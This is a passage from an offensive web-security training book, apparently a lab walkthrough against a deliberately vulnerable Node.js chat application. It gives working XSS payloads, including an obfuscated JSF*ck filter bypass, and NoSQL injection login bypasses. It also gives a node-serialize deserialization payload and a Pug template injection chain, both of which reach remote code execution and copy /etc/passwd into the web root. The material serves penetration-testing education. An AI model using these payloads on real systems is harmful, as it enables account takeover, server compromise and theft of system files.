+already know, the server doesn’t provide adequate input/output validation to the
+user/database and our malicious script code is presented back to user in source code. 
+However, in DOM based XSS, it is slightly different, which many cause some
+common misunderstandings. Therefore, let’s take some time to focus on DOM based
+XSS.
+ 
+Document Object Model (DOM) based XSS is made possible when an attacker can
+manipulate the web application’s client-side scripts.  If an attacker can inject malicious
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+code into the DOM and have it read by the client’s browser, the payload can be
+executed when the data is read back from the DOM.
+ 
+What exactly is the DOM? The Document Object Model (DOM) is a representation of
+HTML properties.  Since your browser doesn’t understand HTML, it uses an
+interpreter that transforms HTML into a model called the DOM. 
+ 
+Let's walk through this on the Chat Support Site.  Looking at the vulnerable web
+application, you should be able to see that the chat site is vulnerable to XSS:
+Create an account
+Login
+Go to Chat
+Try <script>alert(1)</script> and then try some crazy XSS attacks! 
+ 
+In our example, we have Node.js on the server side, socket.io (a library for Node.js)
+setting up web sockets between the user and server, client-side JavaScript, and our
+malicious msg.msgText JavaScript.  As you can see below and in source code for the
+page, you will not see your "alert" payload directly referenced as you would in a
+standard reflective/stored XSS.  In this case, the only reference we would receive that
+indicates where our payload might be called, is from the msg.name reference.  This
+does sometimes make it hard to figure out where our XSS payload is executed or if
+there is a need to break out of any HTML tags.
+ 
+ 
+Advanced XSS in NodeJS
+One of the big reasons why XSS keeps coming back is that it is much harder than just
+filtering for tags or certain characters.  XSS gets really difficult to defend when the
+payloads are specific to a certain language or framework.  Since every language has its
+oddities when it comes to vulnerabilities, it will be no different with NodeJS.
+ 
+In the Advanced XSS section, you are going to walk through a few examples where
+language-specific XSS vulnerabilities come into play.  Our NodeJS web application
+will be using one of the more common web stacks and configurations.  This
+implementation includes the Express Framework (https://expressjs.com/) with the Pug
+template engine (https://pugjs.org/).  It is important to note that by default, Express
+||||||||||||||||||||||||||||||||||||||||
+
+really has no built-in XSS prevention unless rendering through the template engine. 
+When a template engine like Pub is used, there are two common ways of finding XSS
+vulnerabilities: (1) through string interpolation, and (2) buffered code.
+ 
+Template engines have a concept of string interpolation, which is a fancy way of
+saying “placeholders for string variables.”  For example, let's assign a string to a
+variable in the Pug template format:
+- var title = "This is the HTML Title"
+- var THP = "Hack the Planet"
+h1 #{title}
+p The Hacker Playbook will teach you how to 
+#{THP}
+ 
+Notice that the #{THP} is a placeholder for the variable that was assigned prior to
+THP.  We commonly see these templates being used in email distribution messages. 
+Have you ever received an email from an automated system that had Dear
+${first_name}… instead of your actual first name?  This is exactly what templating
+engines are used for.
+ 
+When the template code above is rendered into HTML, it will look like:
+<h1>This is the HTML Title</h1>
+<p>The Hacker Playbook will teach you how to Hack the Planet</p>
+ 
+Luckily, in this case, we are using the "#{}" string interpolation, which is the escaped
+version of Pug interpolation.  As you can see, by using a template, we can create very
+reusable code and make the templates very lightweight.
+ 
+Pug supports both escaped and unescaped string interpolation.  What's the difference
+between escaped and unescaped?  Well, using escaped string interpolation will
+HTML-encode characters like <,>,', and ".  This will assist in providing input
+validation back to the user.  If a developer uses an unescaped string interpolation, this
+will generally lead to XSS vulnerabilities. 
+ 
+Furthermore, string interpolation (or variable interpolation, variable substitution, or
+variable expansion) is the process of evaluating a string literal containing one or more
+placeholders, yielding a result in which the placeholders are replaced with their
+corresponding values. [https://en.wikipedia.org/wiki/String_interpolation]
+In Pug escaped and unescaped string interpolation
+(https://pugjs.org/language/interpolation.html):
+!{} – Unescaped string interpolation
+#{} – Escaped string interpolation  *Although this is escaped, it could
+still be vulnerable to XSS if directly passed through JavaScript
+In JavaScript, unescaped buffer code starts with "!=".  Anything after the "!="
+will automatically execute as JavaScript.
+[https://pugjs.org/language/code.html#unescaped-buffered-code]
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Lastly, anytime raw HTML is allowed to be inserted, there is the potential for
+XSS.
+ 
+In the real world, we have seen many cases that were vulnerable to XSS, based on the
+above notation where the developer forgets which context they are in and from where
+the input is being passed.  Let’s take a look at a few of these examples on our
+vulnerable Chat Support System Application.  Go to the following URL on the VM:
+http://chat:3000/xss.  We will walk through each one of these exercises to understand
+NodeJS/Pug XSS.
+Exercise 1 (http://chat:3000/xss)
+In this example, we have escaped string interpolation into a paragraph tag.  This is not
+exploitable because we are using the correct escaped string interpolation notation
+within the HTML paragraph context.             
+Go to http://chat:3000/xss and click Exercise #1
+The Pug Template Source Code:
+p No results found for 
+#{name1}
+Try entering and submitting the following payload:
+<script>alert(1)</script>
+Click back on Exercise #1 and review the No Results Output
+View the HTML Response (view the Source Code of the page):
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+ 
+ 
+After hitting submit, look at the page source code (ctrl+u) and search for the word
+"alert". 
+You are going to see that the special characters from our payload are converted
+into HTML entities.  The script tags are still visible on our site through our browser,
+but are not rendered into JavaScript.  This use of string interpolation is correct and
+there is really no way to break out of this scenario to find an XSS.  A+ work here! 
+Let's look at some poor implementations.
+Exercise 2
+In this example, we have unescaped string interpolation denoted by the !{} in a
+paragraph tag.  This is vulnerable to XSS by design.  Any basic XSS payload will
+trigger this, such as:  <script>alert(1)</script>
+Go to Exercise #2
+The Pug Template Source Code:
+p No results found for 
+!{name2}
+Try entering the payload:
+||||||||||||||||||||||||||||||||||||||||
+
+<script>alert(1)</script>
+Response:
+<script>alert(1)</script>
+After hitting submit, we should see our pop-up.  You can verify by looking at
+the page source code and searching for "alert".
+ 
+So, using unescaped string interpolation (!{name2}) where user input is submitted,
+leads to a lot of trouble.  This is a poor practice and should never be used for user-
+submitted data.  Any JavaScript we enter will be executed on the victim's browser.
+ 
+Exercise 3
+In this example, we have escaped string interpolation in dynamic inline JavaScript. 
+This means we are protected since it's escaped, right?  Not necessarily.   This example
+is vulnerable because of the code context we are in.  We are going to see that in the
+Pug Template, prior to our escaped interpolation, we are actually inside a script tag. 
+So, any JavaScript, although escaped, will automatically execute.  Even better, because
+we are in a Script tag, we do not need to use the <script> tag as part of our payload. 
+We can use straight JavaScript, such as: alert(1):
+Go to Example #3
+Pug Template Source Code:
+script.
+var user3 = 
+#{name3};
+p No results found for #{name3}
+This template will translate in HTML like the following:
+<script>
+<p>No results found for [escaped user input]</p>
+</script>
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Try entering the payload:
+1;alert(1);
+After hitting submit, we should see our pop-up.  You can verify by looking at
+the page source code and searching for "alert".
+ 
+Although, a small change, the proper way to write this would have been to add quotes
+around the interpolation:
+Pug Template Source Code:
+script.
+var user3="#{name3}"
+Exercise 4
+In this example, we have Pug unescaped buffered code
+(https://pugjs.org/language/code.html) denoted by the != which is vulnerable to XSS
+by design, since there is no escaping.  So in this scenario, we can use the simple "
+<script>alert(1)</script>" style attack against the input field.
+Pug Template Source Code:
+p != 'No results found for '+name4
+Try entering the payload:
+<script>alert(1)</script>
+After hitting submit, we should see our pop-up.  You can verify by looking at
+the page source code and searching for "alert".
+Exercise 5
+Let's say we get to an application that is using both escaped string interpolation and
+some type of filtering.  In our following exercise, we have minimal blacklist filtering
+script being performed within the NodeJS server dropping characters like "<", ">" and
+"alert".  But, again they made the mistake of putting our escaped string interpolation
+within a script tag.  If we can get JavaScript in there, we could have an XSS:
+Go to Example #5
+Pug Template Source Code:
+name5 = req.query.name5.replace(/[;'"<>=]|alert/g,"")
+script.
+var user3 = #{name5};
+Try entering the payload:
+You can try the alert(1), but that doesn't work due to the filter.  You
+could also try things like <script>alert(1)</script>, but escaped code and
+the filter will catch us.  What could we do if we really wanted to get our
+alert(1) payload?
+We need to figure out how to bypass the filter to insert raw JavaScript. 
+Remember that JavaScript is extremely powerful and has lots of functionality. 
+We can abuse this functionality to come up with some creative payloads.  One
+way to bypass these filters is by utilizing esoteric JavaScript notation.  This can
+be created through a site called: http://www.jsfuck.com/.  As you can see
+below, by using brackets, parentheses, plus symbols, and exclamation marks,
+||||||||||||||||||||||||||||||||||||||||
+
+we can recreate alert(1).
+JSF*ck Payload:
+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+
+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[]
+[[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+
+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([!
+[]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+
+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])
+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+
+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!!
+[]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+
+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+
+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+
+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+
+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])
+[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+
+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([!
+[]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+
+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])()
+ 
+ 
+As you know, many browsers have started to include XSS protections.  We have even
+used these payloads to bypass certain browser protections.  Try using them in your
+actual browser outside of Kali, such as Chrome.
+ 
+XSS is not an easy thing to protect from on complex applications.  It is easy to either
+miss or misunderstand how a framework processes input and output.  So when
+performing a source code review for Pug/NodeJS applications, searching for !{ , #{, or
+`${ in source code is helpful for identifying locations for XSS.  Being aware of the
+context, and whether or not escaping is required in that context, is vital as we will see
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+in the following examples. 
+ 
+Although these attacks were specific to Node and Pug, every language has its
+problems against XSS and input validation.  You won't be able to just run a
+vulnerability scanner or XSS fuzzing tool and find all the XSS vulnerabilities.  You
+really need to understand the language and frameworks used.
+ 
+XSS to Compromise
+One question I get often is, how can I go from an XSS to a Shell?  Although there are
+many different ways to do this, we usually find that if we can get a user-to-admin style
+XSS in a Content Management System (CMS) or similar, then this can lead to
+complete compromise of the system.  An entire walkthrough example and code can be
+found here by Hans-Michael Varbaek: https://github.com/Varbaek/xsser.  Hans-
+Michael presented some great examples and videos on recreating an XSS to RCE
+attack.
+ 
+A custom Red Team attack that I like to utilize involves taking advantage of the
+features of JavaScript.  We know that JavaScript is extremely powerful and we have
+seen such features in BeEF (Browser Exploitation Framework).  Therefore, we can
+take all that functionality to perform an attack unbeknownst to the victim.  What would
+this payload do?  One example of an attack is to have the JavaScript XSS payload that
+runs on a victim machine grab the internal (natted) IP address of the victim.  We can
+then take their IP address and start scanning their internal network with our payload. 
+If we find a known web application that allows compromise without authentication, we
+can send a malicious payload to that server. 
+ 
+For example our target could be a Jenkins server, which we know if unauthenticated,
+pretty much allows complete remote code execution.  To see a full walkthrough of an
+XSS to Jenkins compromise, see chapter 5 - Exploiting Internal Jenkins with Social
+Engineering. 
+ 
+NoSQL Injections
+In THP 1 & 2, we spent a fair amount of time learning how to do SQL injections and
+using SQLMap (http://sqlmap.org/).  Other than some obfuscation and integration into
+Burp Suite, not much has changed from THP2.  Instead, I want to delve deeper into
+NoSQL injections as these databases are becoming more and more prevalent. 
+ 
+Traditional SQL databases like MySQL, MSSQL, and Oracle rely on structured data in
+relational databases.  These databases are relational, meaning data in one table has
+relation to data in other tables.  That makes it easy to perform queries such as "give me
+all clients who bought something in the last 30 days”.  The caveat with this data is that
+the format of the data must be kept consistent across the entire database.  NoSQL
+||||||||||||||||||||||||||||||||||||||||
+
+databases consist of the data that does not typically follow the tabular/relational model
+as seen in SQL-queried databases. This data, called "unstructured data" (like pictures,
+videos, social media), doesn't really work with our massive collection data.
+ 
+NoSQL Features:
+Types of NoSQL Databases: Couch/MongoDB
+Unstructured Data
+Grows Horizontally
+ 
+In traditional SQL injections, an attacker would try to break out of an SQL query and
+modify the query on the server-side.  With NoSQL injections, the attacks may execute
+in other areas of an application than in traditional SQL injections.  Additionally, in
+traditional SQL injections, an attacker would use a tick mark to break out.  In NoSQL
+injections, vulnerabilities generally exist where a string is parsed or evaluated into a
+NoSQL call.
+ 
+Vulnerabilities in NoSQL injections typically occur when: (1) the endpoint accepts
+JSON data in the request to NoSQL databases, and (2) we are able to manipulate the
+query using NoSQL comparison operators to change the NoSQL query.
+ 
+A common example of a NoSQL injection would be injecting something like:
+[{"$gt":""}].  This JSON object is basically saying that the operator ($gt) is greater
+than NULL ("").  Since logically everything is greater than NULL, the JSON object
+becomes a true statement, allowing us to bypass or inject into NoSQL queries.  This
+would be equivalent to [' or 1=1--] in the SQL injection world.  In MongoDB, we can
+use one of the following conditional operators:
+(>) greater than - $gt
+(<) less than - $lt
+(>=) greater than equal to - $gte
+(<= ) less than equal to - $lte
+ 
+Attack the Customer Support System NoSQL Application
+First, walk through the NoSQL workflow on the Chat application: 
+In a browser, proxying through Burp Suite, access the Chat application:
+http://chat:3000/nosql
+Try to authenticate with any username and password.  Look at POST traffic
+that was sent during that authentication request in Burp Suite
+.
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+ 
+In our Chat application, we are going to see that during authentication to the
+/loginnosql endpoint, our POST data will contain
+{“username”:”admin”,”password”,”GuessingAdminPassword”}.  It is pretty common
+to see JSON being used in POST requests to authenticate a user, but if we define our
+own JSON objects, we might be able to use different conditional statements to make
+true statements.  This would effectively equal the traditional SQLi 1=1 statement and
+bypass authentication.  Let's see if we can inject this into our application.
+Server Source Code
+In the NoSQL portion of the Chat application, we are going to see the JSON POST
+request as we did before.  Even though, as a black box test, we wouldn't see the server-
+side source code, we can expect it to query the MongoDB backend in some sort of
+fashion similar to this:
+db.collection(collection).find({"username":username,
+"password":password}).limit(1)…
+ 
+Injecting into NoSQL Chat
+As we can see from the server-side source code, we are taking the user-supplied
+username/password to search the database for a match.  If we can modify the POST
+request, we might be able to inject into the database query.
+In a browser, proxying through Burp Suite, access the Chat application:
+http://chat:3000/nosql
+Turn "Intercept" on in Burp Suite, click Login, and submit a username as
+admin and a password of GuessingAdminPassword
+Proxy the traffic and intercept the POST request
+{"username":"admin","password","GuessingAdminPassword"} to
+{"username":"admin","password":{"$gt":""}}
+You should now be logged in as admin!
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+So what happened here?  We changed the string "GuessingAdminPassword" to a
+JSON object {"$gt":""}, which is the TRUE statement as everything Greater Than
+NULL is TRUE.  This changed the POST request to
+{"username":"admin","password":TRUE}, which automatically makes the request
+TRUE and logs in as admin without any knowledge of the password, replicating the
+1=1 attack in SQLi.
+Advanced NoSQLi
+NoSQL injections aren't new, but the purpose of the NodeJS chapter is to show how
+newer frameworks and languages can potentially introduce new vulnerabilities.  For
+example, Node.js has a qs module that has specific syntax to convert HTTP request
+parameters into JSON objects.  The qs module is used by default in Express as part of
+the 'body-parser' middleware.
+qs module: A querystring parsing and stringifying library with some added
+security. [https://www.npmjs.com/package/qs]
+ 
+What does this mean?  If the qs module is utilized, POST requests will be converted on
+the server side as JSON if using bracket notation in the parameters.  Therefore, a
+POST request that looks like username[value]=admin&password[value]=admin will
+be converted into {"username": {"value":"admin"}, "password":{"value":"admin"}}. 
+Now, the qs module will also accept and convert POST parameters to assist in
+NoSQLi:
+For example, we can have a POST request like the following:
+username=admin&password[$gt]=
+And the server-side request conversion would translate to:
+{"username":"admin", "password":{"$gt":""}
+This now looks similar to the original NoSQLi attack.
+ 
+Now, our request looks identical to the NoSQLi we had in the previous section.  Let's
+see this in action:
+Go to http://chat:3000/nosql2
+Turn Burp Intercept On
+Log in with admin:anything
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Modify the POST Parameter:
+username=admin&password[$gt]=&submit=login
+ 
+ 
+You should be logged in with admin!  You have executed the NoSQL injection using
+the qs module parser utilized by the Express Framework as part of the body-parser
+middleware.  But wait, there's more!  What if you didn't know which usernames to
+attack?  Could we use this same attack to find and log in as other accounts? 
+ 
+What if instead of the password comparison, we tried it on the username as well?  In
+this case, the NoSQLi POST request would look something like:
+username[$gt]=admin&password[$gt]=&submit=login
+ 
+The above POST request essentially queries the database for the next username greater
+than admin with the password field resulting in a TRUE statement.  If successful, you
+should be logged in as the next user, in alphabetical order, after admin. Continue doing
+this until you find the superaccount.
+ 
+More NoSQL Payloads:
+https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20injection
+https://blog.websecurify.com/2014/08/hacking-nodejs-and-
+mongodb.htmlhttps://www.owasp.org/index.php/Testing_for_NoSQL_injection
+ 
+Deserialization Attacks
+Over the past few years, serialization/deserialization attacks via web have become
+more and more popular.  We have seen many different talks at BlackHat, discovered
+critical vulnerabilities in common applications like Jenkins and Apache Struts2, and
+are seeing a lot of active research being developed like ysoserial
+(https://github.com/frohoff/ysoserial).  So what's the big deal with deserialization
+attacks?
+ 
+Before we get started, we need to understand why we serialize.  There are many
+reasons to serialize data, but it is most commonly used to generate a storable
+representation of a value/data without losing its type or structure.  Serialization
+||||||||||||||||||||||||||||||||||||||||
+
+converts objects into a stream of bytes to transfer over network or for storage.  Usually
+conversion method involves XML, JSON, or a serialization method specific to the
+language.
+ 
+Deserialization in NodeJS
+Many times, finding complex vulnerabilities requires in-depth knowledge of an
+application.  In our scenario, the Chat NodeJS application is utilizing a vulnerable
+version of serialize.js (https://github.com/luin/serialize).  This node library was found
+to be vulnerable to exploitation due to the fact that "Untrusted data passed into the
+unserialize() function can be exploited to achieve arbitrary code execution by passing a
+JavaScript Object with an Immediately Invoked Function Expression (IIFE).”
+[https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941]
+ 
+Let's walk through the details of an attack to better understand what is happening. 
+First, we review the serialize.js file and do a quick search for eval
+(https://github.com/luin/serialize/search?utf8=%E2%9C%93&q=eval&type=). 
+Generally, allowing user input to go into a JavaScript eval statement is bad news, as
+eval() executes raw JavaScript.  If an attacker is able to inject JavaScript into this
+statement, they would be able to have Remote Code Execution onto the server. 
+ 
+Second, we need to create a serialized payload that will be deserialized and run
+through eval with our JavaScript payload of require('child_process').exec('ls').
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('DO
+SYSTEM COMMANDS HERE', function(error, stdout, stderr) {
+console.log(stdout) });}()"}
+ 
+The JSON object above will pass the following request “()
+{require('child_process').exec('ls')” into the eval statement within the unserialize
+function, giving us remote code execution.  The last part to notice is that the ending
+parenthesis was added "()" because without it our function would not be called.  Ajin
+Abraham, the original researcher who discovered this vulnerability, identified that
+using immediately invoked function expressions or IIFE
+(https://en.wikipedia.org/wiki/Immediately-invoked_function_expression) would
+allow the function to be executed after creation.   More details on this vulnerability can
+be found here: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5941.
+ 
+In our Chat Application example, we are going to look at the cookie value, which is
+being deserialized using this vulnerable library: 
+Go to http://chat:3000
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+Proxy the traffic in burp and look at the cookies
+Identify one cookie name "donotdecodeme"
+Copy that Cookie into Burp Suite Decoder and Base64 decode it
+ 
+ 
+As previously mentioned, every language has its unique oddities and NodeJS is no
+different. 
+In Node/Express/Pug, you are not able to write directly to the web directory
+and have it accessible like in PHP.  There has to be a specified route to a folder that is
+both writable and accessible to the public internet.
+Creating the Payload
+Before you start, remember all these payloads for the lab are in an easy to
+copy/paste format listed here: http://bit.ly/2qBDrFo
+Take the original payload and modify your shell execution "'DO SYSTEM
+COMMANDS HERE"
+{"thp":"_$$ND_FUNC$$_function (){require('child_process').exec('DO
+SYSTEM COMMANDS HERE', function(error, stdout, stderr) {
+console.log(stdout) });}()"}
+Example:
+||||||||||||||||||||||||||||||||||||||||
+
+{"thp":"_$$ND_FUNC$$_function ()
+{require('child_process').exec('echo node deserialization is awesome!!
+>> /opt/web/chatSupportSystems/public/hacked.txt', function(error,
+stdout, stderr) { console.log(stdout) });}()"}
+As the original Cookie was encoded, we will have to base64 encode our
+payload via Burp Decoder/Encoder
+Example Payload:
+eyJ0aHAiOiJfJCRORF9GVU5DJCRfZnVuY3Rpb24gKCl7cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2VjaG8gbm9kZSBkZXNlcmlhbGl6YXRpb24gaXMgYXdlc29tZSEhID4+IC9vcHQvd2ViL2NoYXRTdXBwb3J0U3lzdGVtcy9wdWJsaWMvaGFja2VkLnR4dCcsIGZ1bmN0aW9uKGVycm9yLCBzdGRvdXQsIHN0ZGVycikgeyBjb25zb2xlLmxvZyhzdGRvdXQpIH0pO30oKSJ9
+Log out, turn Burp intercept on, and relay a request for / (home)
+Modify the cookie to the newly created Base64 payload
+Forward the traffic and since the public folder is a route for /, you should be
+able to open a browser and go to http://chat:3000/hacked.txt
+You now have Remote Code Execution!  Feel free to perform post exploitation
+on this system.  Start by trying to read /etc/passwd.
+ 
+ 
+In the source for the node-serialize module, we see that the function expression is
+being evaluated, which is a serious problem for any JavaScript/NodeJS application that
+does this with user input.  This poor practice allowed us to compromise this
+application.
+ 
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+References:
+https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-
+bug-for-remote-code-execution/
+https://github.com/luin/serialize
+https://snyk.io/test/npm/node-serialize?
+severity=high&severity=medium&severity=low
+https://blog.websecurify.com/2017/02/hacking-node-serialize.html
+ 
+Template Engine Attacks - Template Injections
+Template engines are being used more often due to their modularity and succinct code
+compared with standard HTML.  Template injection is when user input is passed
+directly into render templates, allowing modification of the underlying template.  This
+can occur intentionally in wikis, WSYWIG, or email templates.  It is rare for this to
+occur unintentionally, so it is often misinterpreted as just XSS.  Template injection
+often allows the attacker to access the underlying operating system to obtain remote
+code execution.
+ 
+In our next example, you will be performing Template Injection attacks on our NodeJS
+application via Pug.  We are unintentionally exposing ourselves to template injection
+with a meta redirect with user input, which is being rendered directly in Pug using
+template literals `${}`.  It is important to note that template literals allow the use of
+newline characters, which is required for us to break out of the paragraph tag since Pug
+is space- and newline-sensitive, similar to Python.
+ 
+In Pug, the first character or word represents a Pug keyword that denotes a tag or
+function.  You can specify multiline strings as well using indentation as seen below:
+ 
+p.
+This is a paragraph indentation.
+This is still part of the paragraph tag.
+ 
+Here is an example of what HTML and Pug Template would look like:
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+The example text above shows how it would look in HTML and how the
+corresponding Pug Markup language would look like.  With templates and string
+interpolation, we can create quick, reusable, and efficient templates
+Template Injection Example
+The Chat application is vulnerable to a template injection attack.  In the following
+application, we are going to see if we can interact with the Pug templating system. 
+This can generally be done by checking if the input parameter we supply can process
+basic operations.  James Kettle wrote a great paper on attack templates and interacting
+with the underlying template systems (http://ubm.io/2ECTYSi). 
+ 
+Interacting with Pug:
+Go to http://chat:3000 and login with any valid account
+Go to http://chat:3000/directmessage and enter user and comment and 'Send' 
+Next, go back to the directmessage and try entering an XSS payload into the
+user parameter <script>alert(1)</script>
+http://chat:3000/ti?
+user=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&comment=&link=             
+This shows the application is vulnerable to XSS, but can we interact
+with the templating system?
+In Burp history, review the server request/response to the endpoint point /ti?
+user=, and send the request to Burp Repeater (ctrl+r)
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Testing for Basic Operations
+We can test our XSS vulnerable parameter for template injections by passing it in an
+arithmetic string.  If our input is evaluated, it will identify that it is vulnerable to
+template injection.  This is because templates, like coding languages, can easily
+support evaluating arithmetic operators. 
+ 
+Testing Basic Operators:
+Within Burp Repeater, test each of the parameters on /ti for template injection. 
+We can do this by passing a mathematical operation such as 9*9.
+We can see that it did not work and we did not get 81.  Keep in mind that our
+user input is wrapped inside paragraph tags, so we can assume our Pug
+template code looks something like this:
+p Message has been sent to !{user}
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Taking Advantage of Pug Features:
+As we said earlier, Pug is white space delimited (similar to Python) and
+newlines start a fresh template input, which means if we can break out of the
+current line in Pug, we can execute new Template code.  In this case we are
+going to break out of the paragraph tag (<p>), as shown above, and execute
+new malicious template code.  For this to work, we are going to have to use
+some URL encoding to exploit this vulnerability (http://bit.ly/2qxeDiy).
+Let's walk through each of the requirements to perform template injection:
+First, we need to trigger a new line and break out of the current
+template.  This can be done with the following character:
+%0a  new line
+Second, we can utilize the arithmetic function in Pug by using a "=" sign
+%3d  percent encoded "=" sign
+Lastly, we can put in our mathematical equation
+9*9 Mathematical equation
+So, the final payload will look like this:
+[newline]=9*9
+URL Coded:
+GET /ti?user=%0a%3d9*9&comment=&link=
+/ti?user=%0a%3d9*9 gives us 81 in the response body.  You have identified
+template injection in the user parameter!  Let's get remote code execution by
+abusing JavaScript.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+As you can see in the response, instead of the name of the user, we have “81” outside
+the paragraph tags!  This means we were able to inject into the template.
+ 
+We now know that we have some sort of template injection and that we are able to
+perform simple calculations, but we need to see if we can get shell execution.  To get
+shell execution, we have to find the right function to perform execution in
+Node/JavaScript.
+First, we will identify the self global object root and proceed with determining
+which modules and functions we have access to.  We want to eventually use the
+Require function to import the child_process .exec to run operating system
+commands.  In Pug, the "=" character allows us to output the JavaScript
+results.  We will start by accessing the global root:
+[new line]=global
+Encoding the above expression to URL encoding using Burp's Decoder
+tool gives us: %0a%3d%20%67%6c%6f%62%61%6c
+Use the above URL encoding string as the user value and resend.
+If all goes well after submitting the prior request, we will see [object global],
+which means we have access to the global object.
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Parsing the global object:
+Let's see what objects and properties we have access to by using the Pug
+iterator 'each’ within global.  Remember the newline (%0a) and white space
+(%20):
+each val,index in global
+p= index
+URL Encoded:
+%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%0a%20%20%70%3d%20%69%6e%64%65%78
+In the above example, we are using the 'each' iterator which can access a value
+and optionally access an index if we specify for either arrays or objects.  We
+are trying to find what objects, methods, or modules we have access to in the
+global object.  Our ultimate goal is to find something like the "require" method
+to allow us to "require" child process .exec, which allows us to run system
+commands.  From here on out, we are just using trial and error to identify
+methods or objects that will eventually give us the require method.
+ 
+Technet24
+||||||||||||||||||||||||||||||||||||||||
+
+ 
+Finding the Code Execution Function:
+From the previous request, we saw all the objects within global and one that
+was named “process”.  Next, we need to identify interesting objects we have
+access to within global.process:
+each val,index in global.process 
+  p= index
+URL Encoded:
+%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%0a%20%20%70%3d%20%69%6e%64%65%78
+We chose “process” out of all the available methods because we knew it would
+eventually lead to 'require'.  You can try the trial and error process by choosing
+different methods to iterate through:
+each val,index in global.process.mainModule
+p= index
+URL Encoded:
+%0a%65%61%63%68%20%76%61%6c%2c%69%6e%64%65%78%20%69%6e%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%0a%20%20%70%3d%20%69%6e%64%65%78
+ 
+||||||||||||||||||||||||||||||||||||||||
+
+Remote Code Execution:
+Sending this final payload, we should see the "require" function within
+global.process.mainModule.  We can now set this to import a 'child_process'
+with .exec to obtain RCE:
+- var x = global.process.mainModule.require
+- x('child_process').exec('cat /etc/passwd >>
+/opt/web/chatSupportSystems/public/accounts.txt')
+URL Encoded:
+%0a%2d%20%76%61%72%20%78%20%3d%20%67%6c%6f%62%61%6c%2e%70%72%6f%63%65%73%73%2e%6d%61%69%6e%4d%6f%64%75%6c%65%2e%72%65%71%75%69%72%65%20%0a%2d%20%78%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64%20%3e%3e%20%2f%6f%70%74%2f%77%65%62%2f%63%68%61%74%53%75%70%70%6f%72%74%53%79%73%74%65%6d%73%2f%70%75%62%6c%69%63%2f%61%63%63%6f%75%6e%74%73%2e%74%78%74%27%29
+In the above example, we are defining a variable “x” like we would in
+JavaScript, but the dash at the beginning of the line denotes an unbuffered
+output (hidden).  We are using the global object with the modules that we
+needed to eventually get 'require', which allows us to use 'child_process' .exec
+to run system commands. 
+We are outputting the contents of /etc/passwd to the web public root directory,
+which is the only directory we have write access to (as designed by the app
+creators), allowing the user to view the contents.  We could also do a reverse
+shell or anything else allowable with system commands.
+We can see http://chat:3000/accounts.txt will contain the contents of
+/etc/passwd from the web server.
+Use this to perform a full RCE on the system and get a shell back.
+ 
+ 
+Now, can we automate a lot of this?  Of course we can.  A tool called Tplmap
+(https://github.com/epinna/tplmap) runs similar to SQLmap in that it tries all the
+different combinations of template injections:
+cd /opt/tplmap
